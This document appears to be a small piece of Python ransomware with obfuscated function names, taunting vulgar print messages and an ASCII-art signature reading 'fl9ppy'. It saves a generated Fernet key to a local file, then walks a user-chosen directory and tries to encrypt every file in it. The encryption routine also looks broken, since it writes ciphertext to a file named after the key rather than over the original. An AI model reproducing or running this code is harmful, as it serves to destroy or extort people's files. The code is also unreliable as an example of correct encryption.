from cryptography.fernet import Fernet
import os

def AHA1():
    aha1 = Fernet.generate_key()
    with open("aha1.key", "wb") as aha2:
        aha2.write(aha1)
    return aha1

def AHA2():
    with open("aha1.key", "rb") as aha2:
        return aha2.read()

def AHA3(aha1, aha2):
    fernet = Fernet(aha2)
    with open(aha1, "rb") as aha3:
        aha4 = aha3.read()
    aha5 = fernet.encrypt(aha4)
    with open(aha2, "wb") as aha6:
        aha6.write(aha5)

def AHA4(aha6, aha7):
    for aha1, aha2, aha3 in os.walk(aha6):
        for aha4 in aha3:
            aha5 = os.path.join(aha1, aha4)
            try:
                AHA3(aha5, aha7)
            except Exception as e:
                print(f"suck me dry xD")

if __name__ == "__main__":
    aha1 = input("huh? ")
    aha2 = AHA1()
    AHA4(aha1, aha2)
    print("Ai luat-o in gura >~<")

'''
                                                                                                              
                                                                                                              
    ffffffffffffffff  lllllll     999999999                                                                   
   f::::::::::::::::f l:::::l   99:::::::::99                                                                 
  f::::::::::::::::::fl:::::l 99:::::::::::::99                                                               
  f::::::fffffff:::::fl:::::l9::::::99999::::::9                                                              
  f:::::f       ffffff l::::l9:::::9     9:::::9ppppp   ppppppppp   ppppp   pppppppppyyyyyyy           yyyyyyy
  f:::::f              l::::l9:::::9     9:::::9p::::ppp:::::::::p  p::::ppp:::::::::py:::::y         y:::::y 
 f:::::::ffffff        l::::l 9:::::99999::::::9p:::::::::::::::::p p:::::::::::::::::py:::::y       y:::::y  
 f::::::::::::f        l::::l  99::::::::::::::9pp::::::ppppp::::::ppp::::::ppppp::::::py:::::y     y:::::y   
 f::::::::::::f        l::::l    99999::::::::9  p:::::p     p:::::p p:::::p     p:::::p y:::::y   y:::::y    
 f:::::::ffffff        l::::l         9::::::9   p:::::p     p:::::p p:::::p     p:::::p  y:::::y y:::::y     
  f:::::f              l::::l        9::::::9    p:::::p     p:::::p p:::::p     p:::::p   y:::::y:::::y      
  f:::::f              l::::l       9::::::9     p:::::p    p::::::p p:::::p    p::::::p    y:::::::::y       
 f:::::::f            l::::::l     9::::::9      p:::::ppppp:::::::p p:::::ppppp:::::::p     y:::::::y        
 f:::::::f            l::::::l    9::::::9       p::::::::::::::::p  p::::::::::::::::p       y:::::y         
 f:::::::f            l::::::l   9::::::9        p::::::::::::::pp   p::::::::::::::pp       y:::::y          
 fffffffff            llllllll  99999999         p::::::pppppppp     p::::::pppppppp        y:::::y           
                                                 p:::::p             p:::::p               y:::::y            
                                                 p:::::p             p:::::p              y:::::y             
                                                p:::::::p           p:::::::p            y:::::y              
                                                p:::::::p           p:::::::p           y:::::y               
                                                p:::::::p           p:::::::p          yyyyyyy                
                                                ppppppppp           ppppppppp                                                                                                                                              
'''
